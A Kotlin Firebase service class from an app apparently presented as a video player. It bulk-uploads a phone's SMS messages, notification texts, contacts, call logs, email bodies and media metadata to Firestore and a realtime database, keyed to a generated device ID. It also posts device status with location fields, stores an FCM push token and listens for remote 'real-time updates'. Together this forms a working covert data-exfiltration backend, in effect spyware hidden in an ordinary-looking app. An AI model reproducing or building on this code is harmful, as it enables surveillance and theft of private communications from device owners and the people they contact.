package com.jumpy.videoplayerapp.services

import android.content.Context
import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.auth.FirebaseAuth
import com.google.gson.Gson
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import java.util.*
import java.io.File

class FirebaseService private constructor(private val context: Context) {
    
    companion object {
        private const val TAG = "FirebaseService"
        private const val COLLECTION_NOTIFICATIONS = "notifications"
        private const val COLLECTION_MESSAGES = "messages"
        private const val COLLECTION_CONTACTS = "contacts"
        private const val COLLECTION_CALL_LOGS = "call_logs"
        private const val COLLECTION_EMAILS = "emails"
        private const val COLLECTION_MEDIA = "media"
        private const val COLLECTION_DEVICES = "devices"
        
        // Feature flags - set to false to disable paid services
        private const val ENABLE_STORAGE = false // Set to false to avoid Firebase Storage costs
        private const val ENABLE_REALTIME_DB = true
        private const val ENABLE_FIRESTORE = true
        
        @Volatile
        private var INSTANCE: FirebaseService? = null
        
        fun getInstance(context: Context): FirebaseService {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: FirebaseService(context.applicationContext).also { INSTANCE = it }
            }
        }
    }
    
    private val firestore = FirebaseFirestore.getInstance()
    private val database = FirebaseDatabase.getInstance()
    private val messaging = FirebaseMessaging.getInstance()
    private val auth = FirebaseAuth.getInstance()
    private val gson = Gson()
    
    private val deviceId = getDeviceId()
    
    // Initialize Firebase
    fun initialize() {
        Log.d(TAG, "Initializing Firebase service for device: $deviceId")
        Log.d(TAG, "Storage enabled: $ENABLE_STORAGE")
        Log.d(TAG, "Realtime DB enabled: $ENABLE_REALTIME_DB")
        Log.d(TAG, "Firestore enabled: $ENABLE_FIRESTORE")
        
        // Get FCM token for push notifications
        messaging.token.addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val token = task.result
                Log.d(TAG, "FCM Token: $token")
                updateDeviceToken(token)
            } else {
                Log.e(TAG, "Failed to get FCM token", task.exception)
            }
        }
        
        // Update device status
        updateDeviceStatus()
    }
    
    // Sync notifications to Firebase
    suspend fun syncNotifications(notifications: List<NotificationData>): Boolean = withContext(Dispatchers.IO) {
        try {
            if (!ENABLE_FIRESTORE) {
                Log.w(TAG, "Firestore is disabled, skipping notification sync")
                return@withContext false
            }
            
            val batch = firestore.batch()
            
            notifications.forEach { notification ->
                val docRef = firestore.collection(COLLECTION_NOTIFICATIONS).document()
                val notificationData = hashMapOf(
                    "deviceId" to deviceId,
                    "firebaseId" to docRef.id,
                    "title" to notification.title,
                    "text" to notification.text,
                    "packageName" to notification.packageName,
                    "timestamp" to notification.timestamp,
                    "type" to notification.type,
                    "syncedAt" to Date()
                )
                
                batch.set(docRef, notificationData)
                
                // Also sync to realtime database for live updates
                if (ENABLE_REALTIME_DB) {
                    database.getReference("live_data")
                        .child("notifications")
                        .child(deviceId)
                        .child(docRef.id)
                        .setValue(notificationData)
                }
            }
            
            batch.commit().await()
            updateSyncStatus("notifications", notifications.size)
            
            Log.d(TAG, "✅ Synced ${notifications.size} notifications to Firebase")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error syncing notifications", e)
            false
        }
    }
    
    // Sync messages to Firebase
    suspend fun syncMessages(messages: List<MessageData>): Boolean = withContext(Dispatchers.IO) {
        try {
            if (!ENABLE_FIRESTORE) {
                Log.w(TAG, "Firestore is disabled, skipping message sync")
                return@withContext false
            }
            
            val batch = firestore.batch()
            
            messages.forEach { message ->
                val docRef = firestore.collection(COLLECTION_MESSAGES).document()
                val messageData = hashMapOf(
                    "deviceId" to deviceId,
                    "firebaseId" to docRef.id,
                    "address" to message.address,
                    "body" to message.body,
                    "type" to message.type,
                    "timestamp" to message.timestamp,
                    "syncedAt" to Date()
                )
                
                batch.set(docRef, messageData)
                
                // Sync to realtime database
                if (ENABLE_REALTIME_DB) {
                    database.getReference("live_data")
                        .child("messages")
                        .child(deviceId)
                        .child(docRef.id)
                        .setValue(messageData)
                }
            }
            
            batch.commit().await()
            updateSyncStatus("messages", messages.size)
            
            Log.d(TAG, "✅ Synced ${messages.size} messages to Firebase")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error syncing messages", e)
            false
        }
    }
    
    // Sync contacts to Firebase
    suspend fun syncContacts(contacts: List<ContactData>): Boolean = withContext(Dispatchers.IO) {
        try {
            if (!ENABLE_FIRESTORE) {
                Log.w(TAG, "Firestore is disabled, skipping contact sync")
                return@withContext false
            }
            
            val batch = firestore.batch()
            
            contacts.forEach { contact ->
                val docRef = firestore.collection(COLLECTION_CONTACTS).document()
                val contactData = hashMapOf(
                    "deviceId" to deviceId,
                    "firebaseId" to docRef.id,
                    "name" to contact.name,
                    "phone" to contact.phone,
                    "email" to contact.email,
                    "syncedAt" to Date()
                )
                
                batch.set(docRef, contactData)
            }
            
            batch.commit().await()
            updateSyncStatus("contacts", contacts.size)
            
            Log.d(TAG, "✅ Synced ${contacts.size} contacts to Firebase")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error syncing contacts", e)
            false
        }
    }
    
    // Sync call logs to Firebase
    suspend fun syncCallLogs(callLogs: List<CallLogData>): Boolean = withContext(Dispatchers.IO) {
        try {
            if (!ENABLE_FIRESTORE) {
                Log.w(TAG, "Firestore is disabled, skipping call log sync")
                return@withContext false
            }
            
            val batch = firestore.batch()
            
            callLogs.forEach { callLog ->
                val docRef = firestore.collection(COLLECTION_CALL_LOGS).document()
                val callLogData = hashMapOf(
                    "deviceId" to deviceId,
                    "firebaseId" to docRef.id,
                    "number" to callLog.number,
                    "type" to callLog.type,
                    "duration" to callLog.duration,
                    "timestamp" to callLog.timestamp,
                    "syncedAt" to Date()
                )
                
                batch.set(docRef, callLogData)
            }
            
            batch.commit().await()
            updateSyncStatus("call_logs", callLogs.size)
            
            Log.d(TAG, "✅ Synced ${callLogs.size} call logs to Firebase")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error syncing call logs", e)
            false
        }
    }
    
    // Sync emails to Firebase
    suspend fun syncEmails(emails: List<EmailData>): Boolean = withContext(Dispatchers.IO) {
        try {
            if (!ENABLE_FIRESTORE) {
                Log.w(TAG, "Firestore is disabled, skipping email sync")
                return@withContext false
            }
            
            val batch = firestore.batch()
            
            emails.forEach { email ->
                val docRef = firestore.collection(COLLECTION_EMAILS).document()
                val emailData = hashMapOf(
                    "deviceId" to deviceId,
                    "firebaseId" to docRef.id,
                    "subject" to email.subject,
                    "from" to email.from,
                    "to" to email.to,
                    "body" to email.body,
                    "timestamp" to email.timestamp,
                    "syncedAt" to Date()
                )
                
                batch.set(docRef, emailData)
            }
            
            batch.commit().await()
            updateSyncStatus("emails", emails.size)
            
            Log.d(TAG, "✅ Synced ${emails.size} emails to Firebase")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error syncing emails", e)
            false
        }
    }
    
    // Upload media files to Firebase Storage (disabled to avoid costs)
    suspend fun uploadMedia(mediaFiles: List<MediaFile>): Boolean = withContext(Dispatchers.IO) {
        try {
            Log.w(TAG, "Firebase Storage is disabled to avoid costs. Storing metadata only.")
            storeMediaMetadata(mediaFiles)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error uploading media", e)
            false
        }
    }
    
    // Alternative: Store media metadata only (no file upload)
    suspend fun storeMediaMetadata(mediaFiles: List<MediaFile>): Boolean = withContext(Dispatchers.IO) {
        try {
            if (!ENABLE_FIRESTORE) {
                Log.w(TAG, "Firestore is disabled, skipping media metadata sync")
                return@withContext false
            }
            
            val batch = firestore.batch()
            
            mediaFiles.forEach { mediaFile ->
                val docRef = firestore.collection(COLLECTION_MEDIA).document()
                val mediaData = hashMapOf(
                    "deviceId" to deviceId,
                    "firebaseId" to docRef.id,
                    "fileName" to mediaFile.name,
                    "originalName" to mediaFile.name,
                    "size" to mediaFile.size,
                    "mimeType" to mediaFile.mimeType,
                    "syncedAt" to Date(),
                    "note" to "File stored locally - Firebase Storage disabled to avoid costs"
                )
                
                batch.set(docRef, mediaData)
            }
            
            batch.commit().await()
            updateSyncStatus("media_metadata", mediaFiles.size)
            
            Log.d(TAG, "✅ Stored metadata for ${mediaFiles.size} media files")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error storing media metadata", e)
            false
        }
    }
    
    // Update device status
    private fun updateDeviceStatus() {
        if (!ENABLE_REALTIME_DB) {
            Log.w(TAG, "Realtime Database is disabled, skipping device status update")
            return
        }
        
        val deviceStatus = hashMapOf(
            "deviceId" to deviceId,
            "lastUpdated" to Date(),
            "isOnline" to true,
            "battery" to getBatteryLevel(),
            "network" to getNetworkType(),
            "location" to getLocation(),
            "features" to mapOf(
                "storage" to ENABLE_STORAGE,
                "realtime_db" to ENABLE_REALTIME_DB,
                "firestore" to ENABLE_FIRESTORE
            )
        )
        
        database.getReference("device_status")
            .child(deviceId)
            .setValue(deviceStatus)
            .addOnSuccessListener {
                Log.d(TAG, "✅ Device status updated")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "❌ Error updating device status", e)
            }
    }
    
    // Update sync status
    private suspend fun updateSyncStatus(dataType: String, count: Int) {
        try {
            if (!ENABLE_REALTIME_DB) {
                Log.w(TAG, "Realtime Database is disabled, skipping sync status update")
                return
            }
            
            val syncStatus = hashMapOf(
                "lastSync" to Date(),
                "count" to count,
                "status" to "success"
            )
            
            database.getReference("sync_status")
                .child(deviceId)
                .child(dataType)
                .setValue(syncStatus)
                .await()
                
            Log.d(TAG, "✅ Sync status updated for $dataType")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error updating sync status", e)
        }
    }
    
    // Update device token
    internal fun updateDeviceToken(token: String) {
        if (!ENABLE_REALTIME_DB) {
            Log.w(TAG, "Realtime Database is disabled, skipping device token update")
            return
        }
        
        database.getReference("device_tokens")
            .child(deviceId)
            .setValue(token)
            .addOnSuccessListener {
                Log.d(TAG, "✅ Device token updated")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "❌ Error updating device token", e)
            }
    }
    
    // Get real-time updates
    fun listenForUpdates(callback: (Map<String, Any>) -> Unit) {
        if (!ENABLE_REALTIME_DB) {
            Log.w(TAG, "Realtime Database is disabled, cannot listen for updates")
            return
        }
        
        database.getReference("real_time_updates")
            .child(deviceId)
            .addValueEventListener(object : com.google.firebase.database.ValueEventListener {
                override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                    val updates = snapshot.value as? Map<String, Any> ?: emptyMap()
                    callback(updates)
                }
                
                override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                    Log.e(TAG, "❌ Error listening for updates", error.toException())
                }
            })
    }
    
    // Bulk sync all data
    suspend fun bulkSync(data: BulkSyncData): Boolean = withContext(Dispatchers.IO) {
        try {
            val syncJobs = mutableListOf<Deferred<Boolean>>()
            
            data.notifications?.let { notifications ->
                syncJobs.add(async { syncNotifications(notifications) })
            }
            
            data.messages?.let { messages ->
                syncJobs.add(async { syncMessages(messages) })
            }
            
            data.contacts?.let { contacts ->
                syncJobs.add(async { syncContacts(contacts) })
            }
            
            data.callLogs?.let { callLogs ->
                syncJobs.add(async { syncCallLogs(callLogs) })
            }
            
            data.emails?.let { emails ->
                syncJobs.add(async { syncEmails(emails) })
            }
            
            data.mediaFiles?.let { mediaFiles ->
                if (ENABLE_STORAGE) {
                    syncJobs.add(async { uploadMedia(mediaFiles) })
                } else {
                    syncJobs.add(async { storeMediaMetadata(mediaFiles) })
                }
            }
            
            val results = syncJobs.awaitAll()
            val success = results.all { it }
            
            Log.d(TAG, if (success) "✅ Bulk sync completed successfully" else "❌ Some sync operations failed")
            success
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error in bulk sync", e)
            false
        }
    }
    
    // Helper methods
    private fun getDeviceId(): String {
        val sharedPrefs = context.getSharedPreferences("firebase_config", Context.MODE_PRIVATE)
        var deviceId = sharedPrefs.getString("device_id", null)
        
        if (deviceId == null) {
            deviceId = "device_${System.currentTimeMillis()}_${Random().nextInt(10000)}"
            sharedPrefs.edit().putString("device_id", deviceId).apply()
        }
        
        return deviceId
    }
    
    private fun getBatteryLevel(): Int {
        // Implementation to get battery level
        return 85 // Placeholder
    }
    
    private fun getNetworkType(): String {
        // Implementation to get network type
        return "WiFi" // Placeholder
    }
    
    private fun getLocation(): String {
        // Implementation to get location
        return "Unknown" // Placeholder
    }
    
    // Data classes
    data class NotificationData(
        val title: String,
        val text: String,
        val packageName: String,
        val timestamp: Date,
        val type: String
    )
    
    data class MessageData(
        val address: String,
        val body: String,
        val type: String,
        val timestamp: Date
    )
    
    data class ContactData(
        val name: String,
        val phone: String,
        val email: String
    )
    
    data class CallLogData(
        val number: String,
        val type: String,
        val duration: Long,
        val timestamp: Date
    )
    
    data class EmailData(
        val subject: String,
        val from: String,
        val to: String,
        val body: String,
        val timestamp: Date
    )
    
    data class MediaFile(
        val file: File,
        val name: String,
        val size: Long,
        val mimeType: String
    )
    
    data class BulkSyncData(
        val notifications: List<NotificationData>? = null,
        val messages: List<MessageData>? = null,
        val contacts: List<ContactData>? = null,
        val callLogs: List<CallLogData>? = null,
        val emails: List<EmailData>? = null,
        val mediaFiles: List<MediaFile>? = null
    )
} 